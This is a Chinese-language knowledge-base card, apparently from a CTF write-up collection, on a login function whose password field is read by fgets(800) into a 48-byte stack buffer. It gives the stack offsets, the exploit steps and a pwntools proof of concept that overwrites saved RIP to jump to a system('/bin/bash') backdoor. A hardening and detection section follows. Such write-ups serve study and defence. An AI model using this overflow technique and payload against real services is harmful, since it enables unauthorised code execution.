---
id: binary-pwn-stack-login-fgets-unbounded-password-ret2backdoor
title: 登录用户名有长度检查而密码 fgets(800) 无校验写入 48 字节缓冲：登录失败照常返回，覆盖 saved RIP 直跳后门
type: scenario
domain: binary
path: binary/pwn/stack
technique: login-fgets-unbounded-password-ret2text-backdoor
tags:
- pwn
- stack-overflow
- fgets
- login
- ret2text
- backdoor
- no-pie
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:08:44+08:00'
  notes: 已对照原文与截图核对：login 反编译 s1[48]@rbp-0x90、s[95]@rbp-0x60、v3@rbp-0x1，fgets(s,80) 后 if(s[20]) 检查，密码 fgets(s1,800) 无长度校验；backdoor 为 system("/bin/bash")@0x40127e；payload 0x98 偏移与调试输出 0x40127e 一致，打印 Login failed 后拿到 flag。未验证点：不同二进制需按实际栈布局重算偏移。
url: /docs/binary/pwn/stack/binary-pwn-stack-login-fgets-unbounded-password-ret2backdoor/
draft: false
kb_aliases:
- 密码 fgets 溢出
- 登录失败后门
- 双缓冲栈溢出
- ret2backdoor
---

## 一句话结论

登录函数把用户名读入 `s[95]` 时做了 `if (s[20])` 的长度检查，却把密码用 `fgets(s1, 800, stdin)` 读进 `s1[48]`；攻击者走无长度校验的密码字段，用 0x98 字节覆盖 saved RIP 跳到 `system("/bin/bash")` 后门——认证失败只打印一行提示，函数返回时仍从被覆盖的返回地址取址，校验结果阻止不了劫持。

## 原理

- 栈布局：`s1[48]@rbp-0x90`、`s[95]@rbp-0x60`、`v3@rbp-0x1`，saved RBP 在 rbp、saved RIP 在 rbp+8；从 s1 起算到 saved RIP 为 0x90+8 = 0x98。
- `fgets(s1, 800, stdin)` 最多读 799 字节，远超 48 字节缓冲；对照用户名的 `fgets(s, 80)` 读长与缓冲匹配且另有 `if (s[20])` 长度检查——同一函数两条输入路径的安全属性完全不同，攻击者选择没有检查的那条。
- 溢出填充依次覆盖 s1、用户名缓冲 s、`v3` 与 saved RBP。把偏移 40 处（`s1[40]`）填 0，可以避开 `if (s1[40])` 的溢出检测；即便检测被触发，函数返回时也已先走完 epilogue。
- 口令比较 `strcmp(s1, "1q2w3e4r\n")` 失败只会走 else 分支打印 “Login failed” 并返回 0；函数返回需要 `pop saved rbp` + `ret` 到 saved RIP，而 saved RIP 已被 payload 改成后门地址。因此认证是否通过只影响返回值，不影响 `ret` 的取址——这是“认证检查挡不住返回地址劫持”的典型。
- 无 PIE 使后门地址固定，NX 不影响复用已有代码；题目不提供附件时，先通过服务端的 panic 自卸拿到二进制（见关联卡）。

## 触发条件

- 登录/输入函数中某个字段的读取长度明显大于其栈缓冲（本例 800 vs 48）。
- 同一函数内存在可达的 `system("/bin/sh"|"/bin/bash")` 后门。
- 无 Canary（或已泄露）、无 PIE（或已泄露）。
- 溢出检测若会直接退出，需要把检测字节填 0 或先劫持控制流（本例检测在返回前，不影响 ret）。

## 利用步骤

1. 获得二进制：无附件时利用服务端 panic 自卸或其它任意读恢复。
2. 反编译 login：确认 `s1[48]`、`s[95]` 的相对布局，`fgets` 限长 800，`if (s1[40])` 溢出检测，`strcmp` 的 `\n` 结尾，以及后门 `system("/bin/bash")` 地址。
3. 构造 payload：`b'1q2w3e4r\x00'` + `b'\x00' * (0x98 - 9)` + `p64(backdoor)`；前 0x98 字节把 `s1[40]` 等检查字节置 0，末尾覆盖 saved RIP。
4. 用户名发送 `admin` 通过用户名检查；密码发送上述 payload（`sendline` 的换行让 `fgets` 结束读取，payload 内的 NUL 字节照常写入）。
5. 程序打印 “Login failed” 后 login 返回，`ret` 落到后门 `system("/bin/bash")`，执行 `cat flag`。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux')

p = remote('target', 10004)
p.sendlineafter(b'token: ', TOKEN)                 # 平台入口 token，按题目提供值填写
p.sendlineafter(b'Username: ', b'admin')

payload  = b'1q2w3e4r\x00' + b'\x00' * (0x98 - 9)  # 0x98 字节填充，s1[40] 处为 0
payload += p64(0x40127e)                           # saved RIP -> backdoor system("/bin/bash")
p.sendlineafter(b'Password: ', payload)
p.interactive()
```

偏移按实际二进制调整：s1 起始到 saved RIP 的距离 = (rbp - s1) + 8；本布局为 0x90 + 8。

## 变体与关联

- 关联 [[ctf-pwn-panic-self-dump-argv0-binary-recovery]]：同一题在没有附件时先让服务端 panic 自卸二进制，再打本溢出。
- 关联 [[binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text]]：同为登录校验 + ret2backdoor，但那题靠 NUL 截断通过校验且需回填堆指针；本题根本不需要通过校验。
- 关联 [[binary-pwn-stack-ret2text-win-plus-one-align]]：ret2text 的栈对齐变体；若跳后门后 `system` 在 `movaps` 崩溃，检查 RSP 对齐并插入 `ret` gadget 或调整后门入口 +1/+4。
- 边界：若溢出检测分支在返回前直接 `exit`/`abort`，需先满足检测条件（如把检测字节填 0）才能走到 ret；若用户名与密码读取顺序相反，第一处溢出的字节会被第二次读取覆盖。

## 检测与防御

- 所有 `fgets` 的第三个参数使用 `sizeof(buffer)`；不要对同一界面的不同字段使用不一致的限长。
- 编译加固：`-fstack-protector-strong`（帧内有数组会插 Canary）、PIE、NX、Full RELRO；删除后门与调试函数。
- 认证函数的返回值不应与“继续执行”绑定在同一栈帧上：认证失败后立即 `_exit`/跳转错误页，避免失败路径继续走易受攻击的输入函数。
- 检测信号：反编译中同时出现 `char buf[48]` 与 `fgets(buf, 800, ...)`、`if (buf[40])` 检测、`system("/bin/bash")` 后门。 
